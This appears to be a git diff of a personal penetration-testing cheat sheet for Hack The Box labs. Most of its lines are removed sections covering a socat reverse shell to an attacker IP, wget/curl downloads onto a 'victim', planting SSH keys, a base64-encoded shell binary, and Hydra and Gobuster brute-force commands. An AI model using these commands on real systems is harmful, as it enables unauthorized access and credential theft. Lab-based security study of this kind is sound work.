@@ -78,12 +78,7 @@ The presence of the robots.txt does not in itself present any kind of security v
 
  <br/><br/> 
 
-### <span class="useful_shit subtitle">Dirsearch  
 
-* Check out <a href="https://github.com/maurosoria/dirsearch">this link</a> to git clone it.
-* We can use it instead of Dirbuster or Gobuster.
-
- <br/><br/> 
 
 ### <span class="useful_shit subtitle">PrivEsc 😈
 
@@ -120,140 +115,15 @@ The presence of the robots.txt does not in itself present any kind of security v
 * The option `-Wall` is a warning option.  
 
 
- <br/><br/> 
 
-### <span class="useful_shit subtitle">Searchsploit  
 
-* `searchsploit -x [EXPLOIT PATH]`
-* Can be used to view the exploit code.
-
-<br/>
-
-* `searchsploit -m [EXPLOIT PATH]`
-* Copies the exploit to my working directory 😱.
-
-<br/>
-
-* People that name exploits sometimes name the versions wrongly. So, don't trusts the version in the name of the exploit.   
-
- <br/><br/> 
 
 ### <span class="useful_shit subtitle">Upgrading The Reverse Shell   
 
 * The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)  
 
-<br/>  
-
-* Using Python for a psuedo terminal  
-  ```console
-  python -c 'import pty; pty.spawn("/bin/bash")'
-  ```  
-
-* Using socat  WORKED INSTEAD OF `nc`
-  ```console
-  #Listener
-  socat file:`tty`,raw,echo=0 tcp-listen:4444
-
-  #Victim  
-  socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.0.3.4:4444
-  ```  
-
-* Using stty options NOT WORKING WITH ME  
-  ```console
-  # In reverse shell 
-  python -c 'import pty; pty.spawn("/bin/bash")'
-  ctrl-z  
-
-  # In Kali 
-  stty raw -echo  
-  fg
-
-  # In reverse shell
-  reset
-  export ShELL=bash
-  export TERM=xterm-256color
-  stty row <num> columns <cols>
-  ```  
-* If we type `stty -a` it will give me info and I can get the rows and columns from there.
-* I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.  
-
- <br/><br/> 
-
-### <span class="useful_shit subtitle">sudo  
-
-* It can be used to run commands as another user (root is one of them but not the only one). I think by default it runs as root and if I want to run as another user I can use `sudo -u [USERNAME] [COMMAND]`.
 
 
- <br/><br/> 
-
-### <span class="useful_shit subtitle">SSH Keys  
-* We can use ssh keys to privesc  
-
-    ```console
-    Shatha Barqawi@htb[/htb]$ vim id_rsa
-    Shatha Barqawi@htb[/htb]$ chmod 600 id_rsa
-    Shatha Barqawi@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
-
-    root@remotehost#
-    ```  
-
-* This ssh key can be found in the following path if I have access to it `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`.
-
-    <blockquote>
-    Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
-    </blockquote>  
-
-* We can also put our public key in the directory `/home/user/.ssh/authorized_keys` if we have the permissions to do so. How to do that?  
-
-1. Create key on my machine 
-   ```console
-   Shatha Barqawi@htb[/htb]$ ssh-keygen -f key
-   ```
-   * This will create two file `key` (which we will use with `ssh -i`) and `key.pub`(which we will copy to the remote machine).
-
- <br/><br/> 
-
-### <span class="useful_shit subtitle">Transferring Files  
-
-1. Using `wget`  
-* We run a Python HTTP server on our machine and wget or cURL on the victim to download the file   
-
-* On my machine
-  ```console
-  Shatha Barqawi@htb[/htb]$ cd /tmp
-  Shatha Barqawi@htb[/htb]$ python3 -m http.server 8000
-
-  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-  ```
-
-* On victim  
-  ```console
-  user@remotehost$ wget http://10.10.14.1:8000/linenum.
-  ```  
-  OR   
-  ```console
-  user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
-  ```  
-
-2. Using `scp`  
-
-   ```
-   scp [PATH TO FILE ON MY SYSTEM] [USERNAME]@[TARGET IP]:[PATH ON TARGET TO TRANSFER FILE TO]
-   ```
-
-3. Using `base64`  
-* In some cases, there might be firewall protections that prevent us from downloading a file from our machine. In such case we can use `base64` and encode the file into base64 format and then copy/paste the base64 string to the remote server and decode it there.   
-  ```console
-  Shatha Barqawi@htb[/htb]$ base64 shell -w 0
-  ```  
-
-  ```console
-  user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
-  ```  
-
-* To check that we didn't miss anything up during the encoding/deconding process we can use the command `md5sum [FILENAME]` on both machines and check if they're equal.  
-
- <br/><br/> 
 
 ### <span class="useful_shit subtitle">Nmap  
 
@@ -338,28 +208,6 @@ The presence of the robots.txt does not in itself present any kind of security v
 
  <br/><br/> 
 
-### <span class="useful_shit subtitle">BruteForcing
-
-* <span class="useful_shit subtitle"> Hydra</span>
-  * Hydra for SSH and FTP  
-    ```console
-    hydra -l [USER NAME] -p [PASSWORD] [IP ADDRESS] -t [NUMBER OF THREADS] [SSH OR FTP]
-    ```
-  * To use a usernames wordlist we can use the -L option and -P option for a wordlist of passwords.  
-
-<br/> 
-
-* <span class="useful_shit subtitle"> Gobuster Bruteforcing Directories and Subdomains 
-  * Command to bruteforece in `DIR` mode  
-    ```console
-    gobuster dir -u [VICTIM'S LINK] -x [LIST OF EXTENSIONS] -w [WORDLIST PATH]
-    ```  
-
-  * Command to bruteforce `DNS` mode  
-    ```console
-    gobuster dns -d [WEB SERVICE DOMAIN] -W [WORDLIST PATH]
-    ```
-
 
 * We can convert Hex to ASCII using the command `xxd`
 
@@ -368,9 +216,9 @@ The presence of the robots.txt does not in itself present any kind of security v
 
 ## To Be re-written later  
 
-hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
 
-hydra -l admin -P /home/kali/mywordlist ignition.htb http-port-form "/admin?form_key=uCAJwNW5TywTQ3U8&login%5Busername%5D=^USER^&login%5Bpassword%5D=^PASS^"
+
+
 
 gobuster dir -u 10.129.159.48 -x php,jsp -w /home/kali/Documents/cloned_reps/SecLists/Discovery/Web-Content/big.txt
 
@@ -388,15 +236,8 @@ gobuster dir -u http://10.129.159.48:8080/ -x php,jsp -w /home/kali/Documents/cl
 * Groovy Script   
 Groovy is a scripting language with Java-like syntax for the Java platform
 
-* XBruteForcer to bruteforce certain CRMs?
 
-* BruteX to bruteforce passwords.
 
-* Hydra example (Not sure of functionality just yet)   
-```
-$ hydra -l admin -P /home/kali/Documents/cloned_reps/SecLists/Passwords/2020-200_most_used_passwords.txt -vV -f -t 5 10.129.157.36 http-post-form "/\\login:j_username=^USER^&j_password=^PASS^:loginError"
-
-```
 
 * Exploiting the ability to execute arbitrary groovy script in script console in jenkins admin page:
 
